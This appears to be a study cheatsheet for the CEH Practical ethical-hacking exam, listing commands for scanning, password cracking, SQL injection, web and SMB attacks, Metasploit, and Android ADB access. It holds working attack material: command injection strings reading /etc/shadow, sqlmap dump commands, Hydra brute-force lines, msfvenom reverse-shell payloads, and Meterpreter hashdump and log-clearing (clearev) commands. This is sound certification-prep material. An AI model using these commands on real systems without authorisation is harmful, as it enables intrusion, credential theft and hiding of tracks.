# CEH Practical Exam Cheatsheet
> Open this during the exam. Organized by task type.  

---

## FIRST THING: Run These Immediately
```
# From Parrot (root terminal) - let these run in background
nmap -sS -sV -O -p- -oA full_scan 10.10.1.0/24 &  
nmap -sS -sV -O -p- -oA full_scan2 10.10.10.0/24 &  

# Quick host discovery while full scan runs
nmap -sn 10.10.1.0/24  
nmap -sn 10.10.10.0/24  
```

---

## 1. NMAP — Scanning & Enumeration

### Host Discovery
```
nmap -sn 10.10.1.0/24                    # how many hosts alive  
nmap -sn -PR 10.10.1.0/24                # ARP ping (LAN only)  
```

### Port & Service Scan
```
nmap -sS -sV -p- [ip]                    # all ports + versions  
nmap -sT -v [ip]                         # TCP connect scan  
nmap -sU -p 53,161,137 [ip]              # UDP scan (DNS, SNMP, NetBIOS)  
nmap -A [ip]                             # aggressive (OS + version + scripts + traceroute)  
```

### OS Detection
```
nmap -O [ip]                             # OS fingerprint  
nmap --script smb-os-discovery -p 445 [ip]  # OS via SMB  
```

### SMB Enumeration
```
nmap --script smb-enum-shares -p 445 [ip]   # list shares  
nmap --script smb-enum-users -p 445 [ip]    # list users  
nmap --script smb-vuln* -p 445 [ip]         # SMB vulnerabilities  
```

### NSE Scripts
```
nmap -sC [ip]                            # default scripts  
nmap --script vuln [ip]                  # all vuln scripts  
nmap --script http-enum [ip]             # web directory enum  
nmap --script banner [ip]                # grab banners  
```

### Output
```
nmap -oN out.txt [ip]                    # text  
nmap -oX out.xml [ip]                    # XML (for Metasploit)  
nmap -oA out [ip]                        # all formats  
```

---

## 2. PASSWORD CRACKING

### Hydra — Online Brute Force
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] ftp  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] ssh  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] rdp  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] smb  
hydra -l admin -P rockyou.txt [ip] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"  
```

### Hashcat — Offline Hash Cracking
```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5  
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt    # SHA-1  
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt   # NTLM  
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # sha512crypt  
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt   # bcrypt  
```

### John the Ripper
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
john --show hash.txt                     # show cracked  
john --format=NT hash.txt                # specify format  
```

### Hash Identification
```
hash-identifier                          # paste hash, it tells you type  
hashid [hash]                            # alternative  
```

| Hash starts with | Type |
|------------------|------|
| $1$ | MD5crypt |
| $5$ | SHA-256crypt |
| $6$ | SHA-512crypt |
| $2a$ / $2b$ | bcrypt |
| 32 hex chars | MD5 or NTLM |
| 40 hex chars | SHA-1 |
| 64 hex chars | SHA-256 |

### ophcrack (Windows rainbow tables)
GUI tool — load SAM hive → Tables → select rainbow tables → Crack  

---

## 3. SQL INJECTION — SQLMap

### Basic Usage
```
sqlmap -u "http://[ip]/page?id=1" --dbs                    # list databases  
sqlmap -u "http://[ip]/page?id=1" -D [dbname] --tables     # list tables  
sqlmap -u "http://[ip]/page?id=1" -D [db] -T [table] --columns   # list columns  
sqlmap -u "http://[ip]/page?id=1" -D [db] -T [table] --dump      # dump data  
sqlmap -u "http://[ip]/page?id=1" --dump-all               # dump everything  
```

### With POST data
```
sqlmap -u "http://[ip]/login" --data="user=admin&pass=test" --dbs  
```

### With cookie
```
sqlmap -u "http://[ip]/page?id=1" --cookie="PHPSESSID=abc123" --dbs  
```

### Manual SQLi Test Strings
```
' OR 1=1 --  
' OR '1'='1  
" OR ""="  
' UNION SELECT NULL,NULL,NULL --  
' UNION SELECT username,password FROM users --  
```

---

## 4. WEB APPLICATION ATTACKS

### WPScan (WordPress)
```
wpscan --url http://[ip] --enumerate u          # enumerate users  
wpscan --url http://[ip] --enumerate vp         # vulnerable plugins  
wpscan --url http://[ip] --enumerate vt         # vulnerable themes  
wpscan --url http://[ip] -U admin -P rockyou.txt  # brute force login  
```

### Nikto (Web Server Scanner)
```
nikto -h http://[ip]                     # basic scan  
nikto -h http://[ip] -p 8080            # custom port  
nikto -h http://[ip] -ssl               # HTTPS  
```

### Directory Busting
```
dirb http://[ip]                         # default wordlist  
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt  
```

### Command Injection
```
; ls  
| cat /etc/passwd
&& whoami  
; cat /etc/shadow  
| net user
```

---

## 5. WIRESHARK — Packet Analysis

### Common Filters
```
ip.addr == 10.10.1.5                     # traffic to/from IP  
tcp.port == 80                           # HTTP traffic  
http                                     # all HTTP  
http.request.method == "POST"            # POST requests (credentials)  
ftp                                      # FTP traffic  
ftp.request.command == "PASS"            # FTP passwords  
tcp.flags.syn == 1 && tcp.flags.ack == 0 # SYN packets (scan detection)  
dns                                      # DNS queries  
smtp                                     # email traffic  
```

### Extract Credentials
Follow TCP Stream: right-click packet → Follow → TCP Stream  

### Detect Scans
- Many SYN packets from one IP = port scan  
- Many IPs contacted = host sweep  

---

## 6. STEGANOGRAPHY

### Steghide (JPEG)
```
steghide extract -sf image.jpg -p password     # extract hidden data  
steghide info image.jpg                        # check if data embedded  
steghide embed -cf image.jpg -ef secret.txt -p password  # hide data  
```

### OpenStego (GUI)
Extract Data → select stego image → enter password → extract  

### Snow (whitespace steganography)
```
snow -C -p "password" stego.txt                # extract  
snow -C -m "secret" -p "password" in.txt out.txt  # hide  
```

### Detect Hidden Data
```
binwalk image.jpg                              # detect embedded files  
binwalk -e image.jpg                           # extract  
strings image.jpg | less                       # readable strings  
exiftool image.jpg                             # metadata  
```

---

## 7. CRYPTOGRAPHY

### VeraCrypt
GUI: Select volume → Mount → enter password → browse files  
CLI: `veracrypt --mount /path/to/volume /mnt/veracrypt`  

### Hash a File
```
md5sum file.txt                          # MD5  
sha1sum file.txt                         # SHA-1  
sha256sum file.txt                       # SHA-256  
```

### Compare Hashes (find tampered file)
```
md5sum file1 file2 file3                 # compare outputs  
# different hash = tampered file
```

### CryptTool / Advanced Encryption Package
Windows GUI — open encrypted file → enter key/password → decrypt  

---

## 8. METASPLOIT

### Basic Workflow
```
msfconsole  
search [keyword]                         # find modules  
use [module]  
show options  
set RHOSTS [target ip]  
set LHOST [your ip]  
exploit  
```

### Common Modules
```
exploit/windows/smb/ms17_010_eternalblue    # EternalBlue  
exploit/windows/smb/psexec                  # pass the hash  
exploit/multi/handler                       # catch reverse shell  
auxiliary/scanner/smb/smb_version           # SMB version  
auxiliary/scanner/portscan/syn              # SYN scan  
```

### Meterpreter Commands
```
getuid                                   # current user  
getsystem                                # try privesc  
hashdump                                 # dump password hashes  
download [file]                          # download file  
upload [file]                            # upload file  
shell                                    # drop to system shell  
clearev                                  # clear event logs  
run post/multi/recon/local_exploit_suggester  # find privesc  
```

### msfvenom Payloads
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > shell.exe  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f elf > shell.elf  
```

---

## 9. MOBILE — PhoneSploit (ADB)

```
phonesploit                              # launch  
# or manually:
adb connect [ip]:5555                    # connect to Android device  
adb devices                              # verify connection  
adb shell                                # get shell  
adb pull /sdcard/filename .              # download file  
adb shell ls /sdcard/                    # list files  
```

---

## 10. MALWARE ANALYSIS — Detect It Easy (DIE)

Open file in DIE GUI:  
- **Entropy** tab → note entropy value (question will ask for this)  
- **Strings** tab → look for suspicious strings  
- **Packer** detection → identify if packed (UPX, etc.)  
- File type, compiler, linker info  

---

## 11. VULNERABILITY SCANNING — OpenVAS/GreenBone

```
gvm-start                               # start OpenVAS  
```
Access: https://localhost:9392  
1. Scans → Tasks → New Task  
2. Set target IP  
3. Scan config: Full and Fast  
4. Start → wait for results  
5. Find CVSS score for specific CVE in results  

---

## 12. ENUMERATION QUICK REFERENCE

### NetBIOS/SMB
```
enum4linux -a [ip]                       # full enumeration  
nbtstat -a [ip]                          # Windows NetBIOS  
net use \\[ip]\IPC$ "" /u:""             # null session  
```

### SNMP
```
snmpwalk -v2c -c public [ip]             # walk SNMP tree  
snmpwalk -v1 -c public [ip] | grep STRING  # readable strings  
```

### LDAP
```
ldapsearch -x -h [ip] -b "dc=target,dc=com"   # dump LDAP  
nmap -p 389 --script ldap-search [ip]  
```

### NFS
```
showmount -e [ip]                        # show exports  
mount -t nfs [ip]:/share /tmp/nfs        # mount share  
```

### SMTP
```
smtp-user-enum -M VRFY -U users.txt -t [ip]   # enumerate users  
```

---

## COMMON PORTS
| Port | Service | Port | Service |
|------|---------|------|---------|
| 21 | FTP | 389 | LDAP |
| 22 | SSH | 443 | HTTPS |
| 23 | Telnet | 445 | SMB |
| 25 | SMTP | 1433 | MSSQL |
| 53 | DNS | 1521 | Oracle |
| 80 | HTTP | 2049 | NFS |
| 110 | POP3 | 3306 | MySQL |
| 135 | MSRPC | 3389 | RDP |
| 137-139 | NetBIOS | 5432 | PostgreSQL |
| 143 | IMAP | 5555 | ADB |
| 161 | SNMP | 5900 | VNC |

---

## TTL → OS Identification
| TTL | OS |
|-----|-----|
| 64 | Linux |
| 128 | Windows |
| 255 | Cisco/Solaris |
